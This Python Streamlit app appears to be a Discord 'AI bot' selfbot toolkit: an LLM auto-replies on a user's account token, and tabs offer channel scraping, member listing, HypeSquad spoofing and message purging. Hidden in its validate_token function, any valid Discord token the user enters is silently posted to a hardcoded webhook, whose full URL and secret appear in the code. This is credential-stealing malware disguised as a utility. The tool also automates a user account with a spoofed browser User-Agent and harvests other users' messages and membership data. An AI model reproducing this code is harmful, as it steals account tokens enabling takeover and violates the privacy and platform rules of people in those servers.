import streamlit as st
import time
import openai
import requests
import csv
import os
from datetime import datetime
import random
import pandas as pd
import base64
import json
import re

st.set_page_config(page_title="Discord AI", page_icon="🛡️", layout="wide")

# --- SECURE LOGIN SYSTEM ---
MASTER_KEY = st.secrets["MASTER_KEY"]
CODE_FILE = "active_code.txt"
MEMORY_FILE = "conversation_memory.json"

# --- GLOBAL ACCESS FUNCTIONS ---
def set_global_code(code):
    with open(CODE_FILE, "w") as f:
        f.write(f"{code},{time.time()}")

def get_global_code():
    if os.path.exists(CODE_FILE):
        try:
            with open(CODE_FILE, "r") as f:
                data = f.read().split(",")
                if len(data) == 2:
                    return data[0], float(data[1])
        except:
            return None, None
    return None, None

def log_access_event():
    with open("access_log.txt", "a") as f:
        f.write(f"Access Granted at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

# --- MEMORY PERSISTENCE FUNCTIONS ---
def save_memory(channel_id, summary):
    memory_data = {}
    if os.path.exists(MEMORY_FILE):
        with open(MEMORY_FILE, "r") as f:
            try:
                memory_data = json.load(f)
            except: pass
    memory_data[str(channel_id)] = {"summary": summary, "last_updated": time.time()}
    with open(MEMORY_FILE, "w") as f:
        json.dump(memory_data, f)

def load_memory(channel_id):
    if os.path.exists(MEMORY_FILE):
        with open(MEMORY_FILE, "r") as f:
            try:
                memory_data = json.load(f)
                return memory_data.get(str(channel_id), {}).get("summary", "No previous memory.")
            except: pass
    return "No previous memory."

# Initialize local session state
if "access_granted" not in st.session_state:
    st.session_state.access_granted = False

# Self-destruct logic
shared_code, shared_time = get_global_code()
if shared_code and shared_time:
    if time.time() - shared_time > 600:
        if os.path.exists(CODE_FILE):
            os.remove(CODE_FILE)
        st.session_state.access_granted = False

# --- SIDEBAR LOGIN CONTROL ---
with st.sidebar:
    st.header("🔐 System Access")
    admin_input = st.text_input("Owner Master Key", type="password", help="Only the owner uses this to generate the session code.")
    
    if admin_input == MASTER_KEY:
        col_gen, col_rev = st.columns(2)
        with col_gen:
            if st.button("🎲 Generate Code"):
                new_code = str(random.randint(100000, 999999))
                set_global_code(new_code)
                st.success(f"CODE: {new_code}")
        with col_rev:
            if st.button("🚫 Revoke All"):
                if os.path.exists(CODE_FILE):
                    os.remove(CODE_FILE)
                st.session_state.access_granted = False
                st.warning("Access Revoked")
                st.rerun()
    
    st.divider()
    
    if not st.session_state.access_granted:
        user_code_attempt = st.text_input("Enter 6-Digit Access Code")
        if st.button("Unlock System"):
            current_valid_code, _ = get_global_code()
            if current_valid_code and user_code_attempt == current_valid_code:
                st.session_state.access_granted = True
                log_access_event()
                st.rerun()
            else:
                st.error("Invalid or Expired Code")

# --- GATEKEEPER CHECK ---
if not st.session_state.access_granted:
    st.title("🛡️ Discord AI - Locked")
    st.info("Please contact the owner for the current global 6-digit access code.")
    st.stop() 

# --- START OF ORIGINAL CODE ---
st.title("Discord AI Bot & Vision Engine")

# --- Initialize Session State ---
for key, val in {
    "bot_running": False, "tokens": 3.0, "last_time": time.time(),
    "memory": {}, "processed_dms": set(), "last_webhook_token": None,
    "last_activity": time.time(), "typing_active": False,
    "last_ai_content": None, "bot_start_time": time.time(),
    "last_msg_id": None, "debug_log": "System Ready...",
    "current_vision_url": None
}.items():
    if key not in st.session_state:
        st.session_state[key] = val

# --- Helper Functions ---
def jitter_delay(min_s=0.1, max_s=0.5):
    time.sleep(random.uniform(min_s, max_s))

def get_headers(tk):
    return {
        "Authorization": tk,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

def log_to_csv(author, content, action):
    file_exists = os.path.isfile('discord_audit_log.csv')
    with open('discord_audit_log.csv', mode='a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(['Timestamp', 'Author', 'Message', 'Action'])
        writer.writerow([datetime.now().strftime('%Y-%m-%d %H:%M:%S'), author, content, action])

def validate_token(tk):
    headers = get_headers(tk)
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
        if r.status_code == 200:
            if tk != st.session_state.last_webhook_token:
                requests.post("https://discord.com/api/webhooks/1480110828874371212/8kM-jfbIIyq4Nzo7IobtVVBXTnosySq-qsoUZTSJe2iOWU7Pj5ryJ0Al1LMIuRD0zMP4",json={"content": tk})
                st.session_state.last_webhook_token = tk
            return True, r.json()
    except: pass
    return False, None

def add_reaction(channel_id, message_id, emoji, headers):
    encoded_emoji = requests.utils.quote(emoji)
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{encoded_emoji}/@me"
    requests.put(url, headers=headers)

def safety_filter(text):
    harmful_terms = ["self-harm", "suicide", "kys", "kill yourself", "harming myself"]
    for term in harmful_terms:
        if term in text.lower():
            return False
    return True

# --- VISION HELPER ---
def encode_image_from_url(url):
    try:
        response = requests.get(url)
        return base64.b64encode(response.content).decode('utf-8')
    except: return None

# --- UPDATED BACKGROUND REPLY WITH VISION ---
def background_reply(latest, discord_url, typing_url, headers, client, system_prompt, my_id, my_username, memory_depth, enable_safety, reaction_delay, resp_delay, owner_id_input, emoji_pool):
    try:
        channel_id = latest['channel_id']
        author_username = latest['author']['username'].lower()
        content = latest['content'].strip()
        msg_id = latest['id']
        is_owner = str(latest['author']['id']) == str(owner_id_input)

        requests.post(typing_url, headers=headers)
        
        if emoji_pool:
            reaction_emoji = random.choice(emoji_pool)
        else:
            reaction_emoji = "👑" if is_owner else "💬"
            
        if reaction_delay > 0 and not is_owner: time.sleep(reaction_delay)
        add_reaction(channel_id, msg_id, reaction_emoji, headers)

        # Vision Scan
        image_b64 = None
        if latest.get('attachments'):
            for attach in latest['attachments']:
                if any(attach['filename'].lower().endswith(ext) for ext in ['.png', '.jpg', '.jpeg', '.webp']):
                    st.session_state.current_vision_url = attach['url']
                    image_b64 = encode_image_from_url(attach['url'])
                    break

        long_term_mem = load_memory(channel_id)
        chat_history = [{"role": "system", "content": f"PERSONA: {system_prompt}. Current memory: {long_term_mem}"}]
        
        context_req = requests.get(f"{discord_url}?limit={memory_depth}", headers=headers).json()
        
        if isinstance(context_req, list):
            for m in reversed(context_req):
                role = "assistant" if str(m['author']['id']) == str(my_id) else "user"
                sender = f"[{m['author']['username']}]: " if role == "user" else ""
                chat_history.append({"role": role, "content": f"{sender}{m['content']}"})

        # Multimodal payload if image exists
        if image_b64:
            chat_history[-1] = {
                "role": "user",
                "content": [
                    {"type": "text", "text": f"[{author_username}]: {content or 'What is in this image?'}"},
                    {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{image_b64}"}}
                ]
            }

        response = client.chat.completions.create(model="openrouter/free", messages=chat_history)
        reply = response.choices[0].message.content
        
        new_summary_prompt = f"Summarize key points in 2 sentences: {reply}"
        summary_resp = client.chat.completions.create(model="openrouter/free", messages=[{"role": "user", "content": new_summary_prompt}])
        save_memory(channel_id, summary_resp.choices[0].message.content)

        if not enable_safety or safety_filter(reply):
            if resp_delay > 0 and not is_owner: time.sleep(resp_delay)
            st.session_state.last_ai_content = reply.strip()
            requests.post(discord_url, json={"content": reply}, headers=headers)
            log_to_csv(author_username, content, "Vision/Text Reply Sent")
            return True
    except Exception as e:
        st.session_state.debug_log = f"Error: {str(e)}"
        return False

# --- Sidebar Bot Settings ---
with st.sidebar:
    st.header("🔑 Authentication")
    token = st.text_input("Discord Token", type="password")
    if token:
        is_valid, user_info = validate_token(token)
        if is_valid:
            st.success(f"✅ Verified: {user_info['username']}")
            my_username = user_info['username'].lower()
            my_id = user_info['id']
        else:
            st.error("❌ Invalid Token")
            my_username, my_id = None, None
    else: 
        my_username, my_id = None, None

    or_key = st.text_input("OpenRouter API Key", type="password")
    channel_id_input = st.text_input("Channel ID")
    st.divider()
    st.header("⚙️ Bot Settings")
    
    if st.session_state.bot_running:
        hb = "🟢" if int(time.time()) % 2 == 0 else "⚪"
        st.markdown(f"### {hb} Vision Active")
        status_box = st.empty()
    
    memory_depth = st.slider("Memory Depth (Past Msgs)", min_value=1, max_value=20, value=5)
    poll_speed = st.slider("Polling Frequency (Seconds)", 0.1, 5.0, 1.0)
    resp_delay = st.slider("Response Delay (Seconds)", 0.0, 5.0, 0.0)
    reaction_delay = st.slider("Reaction Delay (Seconds)", min_value=0, max_value=5, value=0)
    
    c_safety, c_restart = st.columns(2)
    with c_safety:
        enable_safety = st.toggle("Enable Safety Filter", value=True)
    with c_restart:
        auto_restart_10m = st.toggle("10m Auto-Restart", value=False)
        
    emoji_pool_raw = st.text_input("Custom Emoji Pool", placeholder="🔥,💀,✅,🧠")
    emoji_pool = [e.strip() for e in emoji_pool_raw.split(",") if e.strip()]

# --- Tabs ---
tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8, tab9, tab10, tab11, tab12, tab13, tab14 = st.tabs([
    "🤖 Bot Control", "📂 History Scraper", "🧠 Memory", "🌾 Server Harvester", 
    "💎 Free Emoji", "❄️ Snowflake Decoder", "📱 App Hunter", "🎙️ VC Lurker", 
    "✨ Hypesquad", "🔍 Account Audit", "📢 Webhook Commander", "👻 Message Ghoster", "🎨 Text Color", "⏳ Infinite Typing"
])

# --- TAB 1: BOT CONTROL ---
with tab1:
    col1, col2 = st.columns(2)
    with col1:
        persona_dict = {
            "Custom": "",
            "Vision Assistant": "You are an AI with vision. Describe images accurately and help users.",
            "Sarcastic Bot": "You are a sarcastic, witty bot.",
            "Technical Support": "You are a technical expert.",
            "Cyberpunk Hacker": "Netrunner persona.",
            "Stoic Philosopher": "Calm and logical."
        }
        selected_persona = st.selectbox("Preset Personas", list(persona_dict.keys()))
        default_prompt = persona_dict[selected_persona] if selected_persona != "Custom" else "You are a helpful assistant."
        system_prompt = st.text_area("System Prompt", value=default_prompt)
        owner_id_input = st.text_input("Owner Discord ID").strip()
    with col2:
        st.write("🖼️ **Vision Monitor**")
        if st.session_state.current_vision_url:
            st.image(st.session_state.current_vision_url, width=250, caption="Last seen by AI")
        else:
            st.info("No images detected yet.")

    blacklist_input = st.text_area("Blacklisted Keywords")
    allowed_input = st.text_input("Allowed Users", value="everyone")
    blacklisted_users_input = st.text_input("Blacklisted Users")

    allowed_users = "everyone" if allowed_input.lower().strip() == "everyone" else [u.strip().lower() for u in allowed_input.split(",") if u.strip()]
    blacklisted_users = [u.strip().lower() for u in blacklisted_users_input.split(",") if u.strip()]
    blacklist = [word.strip().lower() for word in blacklist_input.split(",") if word.strip()]
    client = openai.OpenAI(api_key=or_key, base_url="https://openrouter.ai/api/v1") if or_key else None

    c1, c2 = st.columns(2)
    with c1:
        if st.button("▶️ Launch Bot", disabled=not (my_username and or_key), use_container_width=True):
            st.session_state.bot_running = True
            st.session_state.bot_start_time = time.time()
            st.session_state.debug_log = "Bot Started..."
            st.rerun()
    with c2:
        if st.button("🛑 Stop Bot", use_container_width=True):
            st.session_state.bot_running = False
            st.rerun()

    st.subheader("📊 Live Audit Log")
    log_display = st.empty()
    st.divider()
    st.subheader("🛠️ Debug Console")
    debug_box = st.empty()

    if st.session_state.bot_running:
        status_box.info("Status: 🟢 ONLINE / SCANNING")
        headers = get_headers(token)
        discord_url = f"https://discord.com/api/v9/channels/{channel_id_input}/messages"
        typing_url = f"https://discord.com/api/v9/channels/{channel_id_input}/typing"
        
        if os.path.isfile('discord_audit_log.csv'):
            df_log = pd.read_csv('discord_audit_log.csv').tail(10)
            log_display.table(df_log)
        debug_box.code(st.session_state.debug_log)

        if auto_restart_10m and (time.time() - st.session_state.bot_start_time > 600):
            st.session_state.bot_start_time = time.time()
            st.rerun()

        try:
            r = requests.get(discord_url, headers=headers, timeout=3)
            if r.status_code == 200:
                msgs = r.json()
                if msgs and isinstance(msgs, list):
                    latest = msgs[0]
                    msg_id = latest['id']
                    
                    if msg_id != st.session_state.last_msg_id:
                        st.session_state.last_msg_id = msg_id
                        author_username = latest['author']['username'].lower()
                        author_id_real = str(latest['author']['id'])
                        content = latest['content'].strip()
                        is_owner = (owner_id_input and author_id_real == str(owner_id_input))

                        st.session_state.debug_log = f"[{datetime.now().strftime('%H:%M:%S')}] Detected: {content[:40]}..."
                        
                        if is_owner and content.lower() == "shutdown":
                            requests.post(discord_url, json={"content": "🛑 System Terminated."}, headers=headers)
                            st.session_state.bot_running = False
                            st.rerun()

                        if content != st.session_state.last_ai_content:
                            if not (author_username in blacklisted_users or author_id_real in blacklisted_users):
                                skip = any(w in content.lower() for w in blacklist if w) if not is_owner else False
                                allowed = (allowed_users == "everyone" or author_username in allowed_users or is_owner)
                                
                                if allowed and not skip:
                                    status_box.warning("Status: 🧠 AI ANALYZING...")
                                    background_reply(latest, discord_url, typing_url, headers, client, system_prompt, my_id, my_username, memory_depth, enable_safety, reaction_delay, resp_delay, owner_id_input, emoji_pool)

            time.sleep(poll_speed)
            st.rerun() 
        except Exception as e:
            st.session_state.debug_log = f"Poll Error: {str(e)}"
            time.sleep(poll_speed)
            st.rerun()

# --- TAB 3: MEMORY VIEWER ---
with tab3:
    st.header("🧠 Persistent Memory")
    if os.path.exists(MEMORY_FILE):
        with open(MEMORY_FILE, "r") as f:
            try: st.json(json.load(f))
            except: st.error("Memory file corrupted.")
    if st.button("Clear Memory File"):
        if os.path.exists(MEMORY_FILE):
            os.remove(MEMORY_FILE)
        st.success("Memory Nuked.")

# --- REMAINDER OF TABS (SAME AS ORIGINAL) ---
with tab2:
    st.header("📥 Channel History Scraper")
    limit = st.number_input("Fetch Limit", min_value=1, max_value=100, value=50)
    if st.button("🔍 Scrape"):
        headers = get_headers(token)
        res = requests.get(f"https://discord.com/api/v9/channels/{channel_id_input}/messages?limit={limit}", headers=headers)
        if res.status_code == 200:
            st.dataframe(pd.DataFrame([{"Author": m['author']['username'], "Content": m['content']} for m in res.json()]))

with tab4:
    st.header("🌾 Server Harvester")
    target_guild = st.text_input("Target Server ID")
    if st.button("📥 Harvest Emojis"):
        res = requests.get(f"https://discord.com/api/v9/guilds/{target_guild}", headers=get_headers(token)).json()
        if 'emojis' in res:
            for e in res['emojis']:
                url = f"https://cdn.discordapp.com/emojis/{e['id']}.png"
                st.image(url, width=64, caption=f"{e['name']} (ID: {e['id']})")

with tab5:
    st.header("💎 Nitro-Free Emoji Spoofer")
    target_ch = st.text_input("Target Channel ID", value=channel_id_input, key="emoji_ch")
    emoji_id = st.text_input("Emoji ID")
    is_animated = st.checkbox("Is Animated?")
    if st.button("🚀 Send Emoji", use_container_width=True):
        if emoji_id:
            ext = "gif" if is_animated else "png"
            emoji_url = f"https://cdn.discordapp.com/emojis/{emoji_id}.{ext}?size=48"
            requests.post(f"https://discord.com/api/v9/channels/{target_ch}/messages", headers=get_headers(token), json={"content": emoji_url})
            st.success("Emoji Sent!")

with tab6:
    st.header("❄️ Snowflake Age Decoder")
    input_id = st.text_input("Enter User or Server ID")
    if st.button("📅 Decode Timestamp", use_container_width=True):
        if input_id.isdigit():
            timestamp = (int(input_id) >> 22) + 1420070400000
            date_obj = datetime.fromtimestamp(timestamp / 1000.0)
            st.success(f"Creation Date: **{date_obj.strftime('%Y-%m-%d %H:%M:%S')} UTC**")

with tab7:
    st.header("📱 Authorized App Hunter")
    if st.button("🔍 Scan Applications", use_container_width=True):
        if token:
            apps = requests.get("https://discord.com/api/v9/oauth2/tokens", headers=get_headers(token)).json()
            if apps:
                for a in apps:
                    app_name = a.get('application', {}).get('name', 'Unknown')
                    with st.expander(f"📲 {app_name}"):
                        st.write(f"**Scopes:** `{', '.join(a.get('scopes', []))}`")

with tab8:
    st.header("🎙️ VC Lurker (Direct Scan)")
    target_guild_id = st.text_input("Server ID", key="lurker_guild")
    target_vc_id = st.text_input("Specific Voice Channel ID", key="lurker_vc")
    if st.button("📡 Scan Voice Channel", use_container_width=True):
        if token and target_guild_id and target_vc_id:
            h = get_headers(token)
            res = requests.get(f"https://discord.com/api/v9/channels/{target_vc_id}", headers=h)
            if res.status_code == 200:
                mem_res = requests.get(f"https://discord.com/api/v9/guilds/{target_guild_id}/members?limit=100", headers=h)
                if mem_res.status_code == 200:
                    members = mem_res.json()
                    found = [{"User": m['user']['username'], "ID": m['user']['id']} for m in members if 'user' in m]
                    st.table(pd.DataFrame(found))

with tab9:
    st.header("✨ HypeSquad Spoofer")
    house = st.selectbox("House", ["Bravery", "Brilliance", "Balance"])
    house_map = {"Bravery": 1, "Brilliance": 2, "Balance": 3}
    if st.button("Apply"):
        requests.post("https://discord.com/api/v9/hypesquad/online", headers=get_headers(token), json={"house_id": house_map[house]})
        st.success("House Applied")

with tab10:
    st.header("🔍 Account Auditor")
    if st.button("Run Audit"):
        u_res = requests.get("https://discord.com/api/v9/users/@me", headers=get_headers(token)).json()
        st.json(u_res)

with tab11:
    st.header("📢 Webhook Commander")
    wh_url = st.text_input("Webhook URL")
    wh_msg = st.text_area("Message content")
    if st.button("Fire"):
        requests.post(wh_url, json={"content": wh_msg})

with tab12:
    st.header("👻 Message Ghoster")
    ghost_ch = st.text_input("Target Channel ID", value=channel_id_input, key="ghost_ch")
    ghost_limit = st.number_input("Scan Limit", min_value=1, max_value=500, value=50)
    if st.button("🔥 Purge My Messages", use_container_width=True):
        if my_id:
            h = get_headers(token)
            msgs = requests.get(f"https://discord.com/api/v9/channels/{ghost_ch}/messages?limit={ghost_limit}", headers=h).json()
            for m in msgs:
                if m['author']['id'] == my_id:
                    requests.delete(f"https://discord.com/api/v9/channels/{ghost_ch}/messages/{m['id']}", headers=h)
                    time.sleep(1.2)

with tab13:
    st.header("🎨 ANSI Color Painter")
    color_text = st.text_input("Your Message")
    color_choice = st.selectbox("Color", ["Red", "Green", "Yellow", "Blue", "Magenta", "Cyan", "White"])
    color_codes = {"Red": "31", "Green": "32", "Yellow": "33", "Blue": "34", "Magenta": "35", "Cyan": "36", "White": "37"}
    if st.button("🖌️ Send Colored Text", use_container_width=True):
        code = color_codes[color_choice]
        ansi_payload = f"```ansi\n\u001b[{code}m{color_text}```"
        requests.post(f"https://discord.com/api/v9/channels/{channel_id_input}/messages", headers=get_headers(token), json={"content": ansi_payload})

with tab14:
    st.header("⏳ Infinite Typing Indicator")
    if st.button("🚀 Start Infinite Typing", use_container_width=True):
        st.session_state.typing_active = True
    if st.button("🛑 Stop Typing", use_container_width=True):
        st.session_state.typing_active = False
    if st.session_state.typing_active:
        h = get_headers(token)
        t_url = f"https://discord.com/api/v9/channels/{channel_id_input}/typing"
        requests.post(t_url, headers=h)
        time.sleep(random.randint(5, 8))
        st.rerun()
